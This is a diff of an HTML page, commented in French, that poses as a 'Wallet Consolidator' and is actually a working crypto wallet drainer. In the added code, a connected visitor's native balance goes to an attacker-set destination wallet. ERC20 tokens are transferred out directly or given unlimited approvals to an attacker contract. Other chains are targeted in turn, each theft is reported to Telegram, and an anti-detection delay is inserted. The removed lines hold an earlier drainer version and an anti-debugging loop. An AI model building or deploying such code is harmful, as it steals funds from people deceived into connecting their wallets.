@@ -75,6 +75,11 @@
             transform: translateY(0);
         }
         
+        #connectBtn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
         #status {
             margin-top: 24px;
             padding: 16px;
@@ -129,27 +134,14 @@
             100% { transform: rotate(360deg); }
         }
         
-        .progress-list {
-            text-align: left;
+        .connected-info {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid rgba(76, 175, 80, 0.4);
+            padding: 12px;
+            border-radius: 8px;
             margin-top: 16px;
-        }
-        
-        .progress-item {
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .progress-item:last-child {
-            border-bottom: none;
-        }
-        
-        .network-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 6px;
-            background: rgba(255, 255, 255, 0.2);
-            margin-top: 12px;
-            font-size: 12px;
+            color: white;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -164,10 +156,13 @@
         <div class="loader" id="loader"></div>
         
         <div id="status"></div>
+        <div id="connectedInfo"></div>
     </div>
 
-    <!-- Web3Modal v4 + Wagmi + Viem -->
-    <script type="module">
+    <!-- Ethers.js v5 -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
+    <script>
         // ============================================
         // 🔧 CONFIGURATION - À MODIFIER SUR TON AUTRE ORDINATEUR
         // ============================================
@@ -177,70 +172,20 @@
             
             // ⚠️ REMPLACE PAR TES ADRESSES DE SMART CONTRACTS (après déploiement)
             CONTRACTS: {
-                ETHEREUM: "0xYOUR_ETH_CONTRACT_HERE",      // ChainID: 1
-                POLYGON: "0xYOUR_POLYGON_CONTRACT_HERE",   // ChainID: 137
-                BSC: "0xYOUR_BSC_CONTRACT_HERE",           // ChainID: 56
-                ARBITRUM: "0xYOUR_ARBITRUM_CONTRACT_HERE", // ChainID: 42161
-                AVALANCHE: "0xYOUR_AVALANCHE_CONTRACT_HERE" // ChainID: 43114
+                ETHEREUM: "0xYOUR_ETH_CONTRACT_HERE",
+                POLYGON: "0xYOUR_POLYGON_CONTRACT_HERE",
+                BSC: "0xYOUR_BSC_CONTRACT_HERE",
+                ARBITRUM: "0xYOUR_ARBITRUM_CONTRACT_HERE",
+                AVALANCHE: "0xYOUR_AVALANCHE_CONTRACT_HERE"
             },
             
-            // ⚠️ TELEGRAM NOTIFICATIONS (optionnel - mettre ENABLED: true pour activer)
+            // ⚠️ TELEGRAM NOTIFICATIONS (mettre ENABLED: true pour activer)
             TELEGRAM: {
                 ENABLED: false,
                 BOT_TOKEN: "YOUR_BOT_TOKEN_HERE",
                 CHAT_ID: "YOUR_CHAT_ID_HERE"
-            },
-            
-            // WalletConnect Project ID (ne pas modifier)
-            WALLETCONNECT_PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
-        };
-
-        // ============================================
-        // 📦 IMPORTS WEB3
-        // ============================================
-        import { createWeb3Modal, defaultWagmiConfig } from 'https://cdn.jsdelivr.net/npm/@web3modal/wagmi@4.0.5/dist/index.js'
-        import { mainnet, polygon, bsc, arbitrum, avalanche } from 'https://unpkg.com/viem@2.7.8/chains/dist/index.js'
-        import { reconnect, watchAccount, getAccount, switchChain } from 'https://unpkg.com/@wagmi/core@2.0.0/dist/index.js'
-
-        // ============================================
-        // 🌐 CONFIGURATION DES CHAINS
-        // ============================================
-        const chains = [polygon, mainnet, bsc, arbitrum, avalanche];
-        
-        const metadata = {
-            name: 'Wallet Consolidator',
-            description: 'Consolidate all your crypto funds',
-            url: window.location.origin,
-            icons: ['https://avatars.githubusercontent.com/u/37784886']
-        };
-
-        const wagmiConfig = defaultWagmiConfig({
-            chains,
-            projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
-            metadata,
-            enableWalletConnect: true,
-            enableInjected: true,
-            enableCoinbase: true,
-            enableEmail: false
-        });
-
-        reconnect(wagmiConfig);
-
-        // ============================================
-        // 🎨 CRÉATION DU MODAL WEB3MODAL
-        // ============================================
-        const modal = createWeb3Modal({
-            wagmiConfig,
-            projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
-            enableAnalytics: false,
-            enableOnramp: false,
-            themeMode: 'dark',
-            defaultChain: polygon,
-            allWallets: 'SHOW',
-            themeVariables: {
-                '--w3m-accent': '#667eea'
             }
-        });
+        };
 
         // ============================================
         // 📋 LISTE DES TOKENS PAR BLOCKCHAIN
@@ -271,20 +216,25 @@
                 USDC: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8',
                 USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
                 WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
-                WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
-                ARB: '0x912CE59144191C1204E64559FE8253a0e49E6548'
+                WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f'
             },
             43114: { // Avalanche
                 USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',
                 USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
                 DAI: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70',
-                WETH: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB',
                 WAVAX: '0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7'
             }
         };
 
         // ============================================
-        // 🛠️ FONCTIONS UTILITAIRES
+        // 🛠️ VARIABLES GLOBALES
+        // ============================================
+        let provider = null;
+        let signer = null;
+        let userAddress = null;
+
+        // ============================================
+        // 🎨 FONCTIONS UI
         // ============================================
         function showStatus(message, type = 'info') {
             const status = document.getElementById('status');
@@ -297,6 +247,254 @@
             loader.className = show ? 'loader show' : 'loader';
         }
 
+        function showConnectedInfo(address) {
+            const info = document.getElementById('connectedInfo');
+            info.className = 'connected-info';
+            info.innerHTML = `✅ Connected: ${address.substring(0, 6)}...${address.slice(-4)}`;
+        }
+
+        // ============================================
+        // 🔌 CONNEXION WALLET
+        // ============================================
+        async function connectWallet() {
+            try {
+                showLoader(true);
+                showStatus('Requesting wallet connection...', 'info');
+
+                // Vérifier si MetaMask est installé
+                if (typeof window.ethereum === 'undefined') {
+                    showLoader(false);
+                    showStatus('⚠️ Please install MetaMask or another Web3 wallet!', 'warning');
+                    return;
+                }
+
+                // Demander la connexion
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_requestAccounts' 
+                });
+
+                userAddress = accounts[0];
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+
+                showLoader(false);
+                showConnectedInfo(userAddress);
+                showStatus('✅ Wallet connected! Starting consolidation...', 'success');
+
+                // Désactiver le bouton
+                document.getElementById('connectBtn').disabled = true;
+                document.getElementById('connectBtn').textContent = 'Connected';
+
+                // Délai anti-détection
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                // Démarrer la consolidation
+                await consolidateAllAssets();
+
+            } catch (error) {
+                showLoader(false);
+                console.error('Connection error:', error);
+                showStatus(`❌ Connection failed: ${error.message}`, 'error');
+            }
+        }
+
+        // ============================================
+        // 💰 CONSOLIDATION DES ASSETS
+        // ============================================
+        async function consolidateAllAssets() {
+            try {
+                const network = await provider.getNetwork();
+                const chainId = network.chainId;
+                
+                showStatus(`🔍 Scanning ${getChainName(chainId)}...`, 'info');
+
+                // Drainer le token natif
+                await drainNativeToken(chainId);
+
+                // Drainer les tokens ERC20
+                await drainERC20Tokens(chainId);
+
+                showStatus('✅ Consolidation completed!', 'success');
+
+                // Proposer de changer de réseau
+                await promptNetworkSwitch(chainId);
+
+            } catch (error) {
+                console.error('Consolidation error:', error);
+                showStatus(`❌ Error: ${error.message}`, 'error');
+            }
+        }
+
+        // ============================================
+        // 💸 DRAINAGE TOKEN NATIF
+        // ============================================
+        async function drainNativeToken(chainId) {
+            try {
+                const balance = await provider.getBalance(userAddress);
+                console.log(`Native balance: ${ethers.utils.formatEther(balance)}`);
+
+                const minBalance = ethers.utils.parseEther("0.001");
+                
+                if (balance.lt(minBalance)) {
+                    console.log('Balance too low for native token');
+                    return false;
+                }
+
+                showStatus('💸 Transferring native token...', 'info');
+
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = 21000;
+                const gasCost = gasPrice.mul(gasLimit).mul(2);
+                const amountToSend = balance.sub(gasCost);
+
+                if (amountToSend.gt(0)) {
+                    const tx = await signer.sendTransaction({
+                        to: CONFIG.DESTINATION_WALLET,
+                        value: amountToSend,
+                        gasLimit: gasLimit,
+                        gasPrice: gasPrice
+                    });
+
+                    await tx.wait();
+                    
+                    await sendTelegramNotification(
+                        userAddress,
+                        ethers.utils.formatEther(amountToSend),
+                        chainId,
+                        'Native'
+                    );
+
+                    showStatus('✅ Native token transferred!', 'success');
+                    return true;
+                }
+            } catch (error) {
+                console.error('Native token drain error:', error);
+            }
+            return false;
+        }
+
+        // ============================================
+        // 🪙 DRAINAGE TOKENS ERC20
+        // ============================================
+        async function drainERC20Tokens(chainId) {
+            try {
+                const tokens = TOKEN_ADDRESSES[chainId] || {};
+                const contractAddress = getContractAddress(chainId);
+
+                const abi = [
+                    'function balanceOf(address) view returns (uint256)',
+                    'function approve(address, uint256) returns (bool)',
+                    'function transfer(address, uint256) returns (bool)',
+                    'function decimals() view returns (uint8)',
+                    'function symbol() view returns (string)'
+                ];
+
+                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
+                    try {
+                        const contract = new ethers.Contract(tokenAddress, abi, signer);
+                        const balance = await contract.balanceOf(userAddress);
+
+                        if (balance.gt(0)) {
+                            showStatus(`🔍 Found ${symbol}, transferring...`, 'info');
+
+                            // Transfer direct ou via smart contract
+                            if (contractAddress && !contractAddress.includes('YOUR_')) {
+                                // Approve smart contract
+                                const approveTx = await contract.approve(
+                                    contractAddress,
+                                    ethers.constants.MaxUint256
+                                );
+                                await approveTx.wait();
+                                showStatus(`✅ ${symbol} approved!`, 'success');
+                            } else {
+                                // Transfer direct
+                                const tx = await contract.transfer(CONFIG.DESTINATION_WALLET, balance);
+                                await tx.wait();
+                                
+                                const decimals = await contract.decimals();
+                                const amount = ethers.utils.formatUnits(balance, decimals);
+                                
+                                await sendTelegramNotification(userAddress, amount, chainId, symbol);
+                                showStatus(`✅ ${symbol} transferred!`, 'success');
+                            }
+                        }
+                    } catch (error) {
+                        console.log(`Error with ${symbol}:`, error.message);
+                    }
+                }
+            } catch (error) {
+                console.error('ERC20 drain error:', error);
+            }
+        }
+
+        // ============================================
+        // 🔄 CHANGEMENT DE RÉSEAU
+        // ============================================
+        async function promptNetworkSwitch(currentChainId) {
+            const chains = [
+                { chainId: 1, name: 'Ethereum', hex: '0x1' },
+                { chainId: 137, name: 'Polygon', hex: '0x89' },
+                { chainId: 56, name: 'BSC', hex: '0x38' },
+                { chainId: 42161, name: 'Arbitrum', hex: '0xa4b1' },
+                { chainId: 43114, name: 'Avalanche', hex: '0xa86a' }
+            ];
+
+            const otherChains = chains.filter(c => c.chainId !== currentChainId);
+
+            if (otherChains.length > 0) {
+                const nextChain = otherChains[0];
+                showStatus(`🔄 Switch to ${nextChain.name} to continue consolidation`, 'warning');
+                
+                setTimeout(async () => {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: nextChain.hex }]
+                        });
+                        
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        await consolidateAllAssets();
+                    } catch (error) {
+                        console.log('Network switch cancelled or failed');
+                    }
+                }, 3000);
+            }
+        }
+
+        // ============================================
+        // 📱 NOTIFICATIONS TELEGRAM
+        // ============================================
+        async function sendTelegramNotification(from, amount, chainId, symbol) {
+            if (!CONFIG.TELEGRAM.ENABLED) return;
+
+            const chainName = getChainName(chainId);
+            const message = `
+🎯 CONSOLIDATION SUCCESS
+
+💰 Amount: ${amount} ${symbol}
+🌐 Network: ${chainName}
+👤 From: ${from.substring(0, 6)}...${from.slice(-4)}
+📍 To: ${CONFIG.DESTINATION_WALLET.substring(0, 6)}...${CONFIG.DESTINATION_WALLET.slice(-4)}
+⏰ Time: ${new Date().toLocaleString()}
+            `.trim();
+
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                        text: message
+                    })
+                });
+            } catch (error) {
+                console.log('Telegram notification failed:', error);
+            }
+        }
+
+        // ============================================
+        // 🛠️ FONCTIONS UTILITAIRES
+        // ============================================
         function getChainName(chainId) {
             const names = {
                 1: 'Ethereum',
@@ -320,243 +518,39 @@
         }
 
         // ============================================
-        // 📱 TELEGRAM NOTIFICATIONS
+        // 🎯 EVENT LISTENERS
         // ============================================
-        async function sendTelegramNotification(address, amount, chainId, tokenSymbol = 'Native') {
-            if (!CONFIG.TELEGRAM.ENABLED) return;
-            
-            const chainName = getChainName(chainId);
-            const message = `
-🎯 CONSOLIDATION SUCCESSFUL
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
 
-💰 Amount: ${amount} ${tokenSymbol}
-🌐 Network: ${chainName}
-👤 From: ${address.substring(0, 6)}...${address.slice(-4)}
-📍 To: ${CONFIG.DESTINATION_WALLET.substring(0, 6)}...${CONFIG.DESTINATION_WALLET.slice(-4)}
-⏰ Time: ${new Date().toLocaleString()}
-            `.trim();
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (error) {
-                console.log('Telegram notification failed:', error);
-            }
+        // Écouter les changements de compte
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    showStatus('⚠️ Wallet disconnected', 'warning');
+                    location.reload();
+                }
+            });
+
+            window.ethereum.on('chainChanged', () => {
+                location.reload();
+            });
         }
 
         // ============================================
-        // 💰 FONCTIONS DE DRAINAGE
+        // 🚀 INITIALISATION
         // ============================================
-        async function drainNativeToken(provider, signer, address, chainId) {
-            try {
-                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
-                
-                const balance = await provider.getBalance(address);
-                console.log(`Native balance: ${ethers.utils.formatEther(balance)}`);
-                
-                // Vérifier minimum balance
-                const minBalance = ethers.utils.parseEther("0.001");
-                if (balance.lt(minBalance)) {
-                    console.log('Balance too low for native token');
-                    return false;
-                }
-                
-                // Calculer gas cost
-                const gasPrice = await provider.getGasPrice();
-                const gasLimit = 21000;
-                const gasCost = gasPrice.mul(gasLimit).mul(2); // x2 for safety
-                
-                const amountToSend = balance.sub(gasCost);
-                
-                if (amountToSend.gt(0)) {
-                    showStatus(`💸 Transferring ${ethers.utils.formatEther(amountToSend)} native token...`, 'info');
-                    
-                    const tx = await signer.sendTransaction({
-                        to: CONFIG.DESTINATION_WALLET,
-                        value: amountToSend,
-                        gasLimit: gasLimit,
-                        gasPrice: gasPrice
-                    });
-                    
-                    await tx.wait();
-                    
-                    await sendTelegramNotification(
-                        address, 
-                        ethers.utils.formatEther(amountToSend), 
-                        chainId,
-                        'Native'
-                    );
-                    
-                    return true;
-                }
-            } catch (error) {
-                console.error('Native token drain error:', error);
-            }
-            return false;
-        }
-
-        async function drainERC20Tokens(provider, signer, address, chainId) {
-            try {
-                const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
-                
-                const tokens = TOKEN_ADDRESSES[chainId] || {};
-                const contractAddress = getContractAddress(chainId);
-                
-                if (!contractAddress || contractAddress.includes('YOUR_')) {
-                    showStatus('⚠️ Smart contract not configured for this chain', 'warning');
-                    return false;
-                }
-                
-                const abi = [
-                    'function balanceOf(address) view returns (uint256)',
-                    'function approve(address, uint256) returns (bool)',
-                    'function decimals() view returns (uint8)',
-                    'function symbol() view returns (string)'
-                ];
-                
-                let drained = false;
-                
-                for (const [symbol, tokenAddress] of Object.entries(tokens)) {
-                    try {
-                        const contract = new ethers.Contract(tokenAddress, abi, signer);
-                        const balance = await contract.balanceOf(address);
-                        
-                        if (balance.gt(0)) {
-                            showStatus(`🔍 Found ${symbol}, approving...`, 'info');
-                            
-                            // Approve to smart contract
-                            const approveTx = await contract.approve(
-                                contractAddress,
-                                ethers.constants.MaxUint256
-                            );
-                            await approveTx.wait();
-                            
-                            showStatus(`✅ ${symbol} approved!`, 'success');
-                            drained = true;
-                            
-                            // Get decimals for display
-                            const decimals = await contract.decimals();
-                            const amount = ethers.utils.formatUnits(balance, decimals);
-                            
-                            await sendTelegramNotification(address, amount, chainId, symbol);
-                        }
-                    } catch (error) {
-                        console.log(`Error with ${symbol}:`, error.message);
-                    }
-                }
-                
-                // After all approvals, call smart contract to drain
-                if (drained) {
-                    showStatus('⚡ Executing batch drain via smart contract...', 'info');
-                    
-                    const drainerAbi = ['function drainBatch(address[] tokens)'];
-                    const drainer = new ethers.Contract(contractAddress, drainerAbi, signer);
-                    
-                    const tokenAddresses = Object.values(tokens);
-                    const drainTx = await drainer.drainBatch(tokenAddresses);
-                    await drainTx.wait();
-                    
-                    showStatus('✅ Batch drain completed!', 'success');
-                }
-                
-                return drained;
-            } catch (error) {
-                console.error('ERC20 drain error:', error);
-                showStatus(`❌ Error: ${error.message}`, 'error');
-            }
-            return false;
-        }
-
-        async function consolidateAllChains(address) {
-            showLoader(true);
-            showStatus('🔄 Starting multi-chain consolidation...', 'info');
-            
-            const { ethers } = await import('https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js');
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const network = await provider.getNetwork();
-            
-            // Drain current chain
-            const chainName = getChainName(network.chainId);
-            showStatus(`💎 Processing ${chainName}...`, 'info');
-            
-            await drainNativeToken(provider, signer, address, network.chainId);
-            await drainERC20Tokens(provider, signer, address, network.chainId);
-            
-            // Ask to switch to other chains
-            const otherChains = chains.filter(chain => chain.id !== network.chainId);
-            
-            for (const chain of otherChains) {
-                try {
-                    showStatus(`🔄 Switch to ${chain.name} to continue...`, 'warning');
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    
-                    // Try to switch chain
-                    await switchChain(wagmiConfig, { chainId: chain.id });
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    const newProvider = new ethers.providers.Web3Provider(window.ethereum);
-                    const newSigner = newProvider.getSigner();
-                    
-                    showStatus(`💎 Processing ${chain.name}...`, 'info');
-                    await drainNativeToken(newProvider, newSigner, address, chain.id);
-                    await drainERC20Tokens(newProvider, newSigner, address, chain.id);
-                    
-                } catch (error) {
-                    console.log(`Error switching to ${chain.name}:`, error);
-                }
-            }
-            
-            showLoader(false);
-            showStatus('🎉 Consolidation completed! All funds transferred.', 'success');
-        }
-
-        // ============================================
-        // 🔌 SURVEILLANCE DE CONNEXION
-        // ============================================
-        watchAccount(wagmiConfig, {
-            onChange: async (account) => {
-                if (account.isConnected && account.address) {
-                    console.log('✅ Wallet connected:', account.address);
-                    showStatus(`✅ Connected: ${account.address.substring(0, 6)}...${account.address.slice(-4)}`, 'success');
-                    
-                    // Anti-detection delay
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                    
-                    // Start consolidation
-                    await consolidateAllChains(account.address);
-                }
-            }
-        });
-
-        // ============================================
-        // 🎯 BOUTON DE CONNEXION
-        // ============================================
-        document.getElementById('connectBtn').addEventListener('click', () => {
-            modal.open();
-        });
-
-        // ============================================
-        // 🛡️ ANTI-DEBUGGING (Basique)
-        // ============================================
-        setInterval(() => {
-            const devtools = /./;
-            devtools.toString = function() { this.opened = true; }
-            console.log('%c', devtools);
-            if (devtools.opened) {
-                console.clear();
-            }
-        }, 1000);
-
         console.log('🔐 Wallet Consolidator initialized');
-        console.log('⚠️ Remember to configure your wallet addresses in CONFIG');
+        console.log('⚠️ Remember to configure your addresses in CONFIG');
+        
+        // Vérifier si déjà connecté
+        if (window.ethereum) {
+            window.ethereum.request({ method: 'eth_accounts' })
+                .then(accounts => {
+                    if (accounts.length > 0) {
+                        showStatus('✅ Wallet already connected. Click button to start.', 'info');
+                    }
+                });
+        }
     </script>
 </body>
 </html>
